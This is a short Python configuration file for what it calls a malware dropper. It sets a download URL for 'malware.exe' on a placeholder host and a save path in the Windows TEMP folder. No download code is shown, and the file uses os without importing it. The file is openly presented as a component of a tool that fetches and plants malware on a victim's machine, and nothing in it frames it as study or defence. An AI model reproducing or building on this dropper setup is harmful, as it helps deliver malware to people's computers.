# config.py - Configuration file for the dropper.

# URL of the malware to download
MALWARE_URL = "http://example.com/path/to/malware.exe"

# Local path to save the downloaded malware
MALWARE_PATH = os.path.join(os.getenv('TEMP'), 'malware.exe')